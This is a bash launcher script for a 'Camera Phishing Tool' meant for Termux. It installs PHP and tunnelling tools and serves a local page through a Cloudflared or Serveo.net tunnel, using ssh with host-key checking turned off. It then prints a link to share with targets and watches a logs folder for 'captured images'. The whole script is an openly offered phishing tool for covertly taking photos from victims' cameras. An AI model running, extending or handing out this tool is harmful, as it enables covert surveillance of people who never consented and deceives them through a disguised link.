#!/bin/bash

# Color Definitions
bold_red='\e[1;91m'
bright_green='\e[1;92m'
gold='\e[1;93m'
electric_blue='\e[1;94m'
vivid_purple='\e[1;95m'
cyan='\e[1;96m'
white='\e[1;97m'
reset='\e[0m'

# Your Exact ASCII Banner
echo -e "${vivid_purple}
    ______                         ____     __       _            __
   / ____/  ____ _   ____ ___     / __ \   / /_     (_)  _____   / /_
  / /      / __ \`/  / __ \`__ \   / /_/ /  / __ \   / /  / ___/  / __ \\
 / /___   / /_/ /  / / / / / /  / ____/  / / / /  / /  (__  )  / / / /
 \____/   \__,_/  /_/ /_/ /_/  /_/      /_/ /_/  /_/  /____/  /_/ /_/
${reset}"
echo -e "${gold}      [ Camera Phishing Tool ]${reset}\n"

# Dependency Installation
echo -e "${gold}[+] Checking & Installing required packages...${reset}"
required_pkgs=(php openssh wget inotify-tools)
for pkg in "${required_pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${electric_blue}Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# Cloudflared Installation
if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${electric_blue}Installing cloudflared...${reset}"
    pkg install cloudflared -y >/dev/null 2>&1
fi

# Tunnel Selection Menu
echo -e "${gold}\n[+] Choose Tunnel Option:${reset}"
echo -e "${bright_green}1) Localhost (default)${reset}"
echo -e "${electric_blue}2) Cloudflared${reset}"
echo -e "${bold_red}3) Serveo.net (SSH Tunnel)${reset}"
echo -ne "${gold}Enter your choice [1-3]: ${white}"
read opt
opt=${opt:-1}

# Start PHP Server
echo -e "${gold}\n[+] Starting PHP server on localhost:8080${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 >/dev/null 2>&1 &
sleep 3

# Tunnel Setup
link=""
case $opt in
    2)
        echo -e "${gold}[+] Starting Cloudflared tunnel...${reset}"
        killall cloudflared >/dev/null 2>&1
        cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
        sleep 5
        
        echo -e "${gold}[+] Fetching Cloudflared link...${reset}"
        for i in {1..15}; do
            link=$(grep -o "https://[^ ]*\\.trycloudflare.com" .clflog | head -n1)
            [ -n "$link" ] && break
            sleep 1
        done
        ;;
    3)
        echo -e "${gold}[+] Starting Serveo.net tunnel...${reset}"
        killall ssh >/dev/null 2>&1
        ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
        sleep 7
        
        echo -e "${gold}[+] Fetching Serveo link...${reset}"
        for i in {1..15}; do
            link=$(grep -o "https://[^ ]*\\.serveo.net" .servolog | head -n1)
            [ -n "$link" ] && break
            sleep 1
        done
        
        [ -z "$link" ] && { echo -e "${bold_red}[-] Serveo tunnel failed${reset}"; exit 1; }
        ;;
    *)
        link="http://localhost:8080"
        ;;
esac

# Display Sharing Info
echo -e "\n${cyan}[+] Share this link: ${bright_green}$link${white}"
echo -e "${gold}\n[+] Monitoring for captured images...${reset}"

# Image Capture Monitoring
mkdir -p logs
while true; do
    new_file=$(inotifywait -qe create --format '%f' logs 2>/dev/null)
    echo -e "${bright_green}[+] New capture: ${white}logs/$new_file${reset}"
done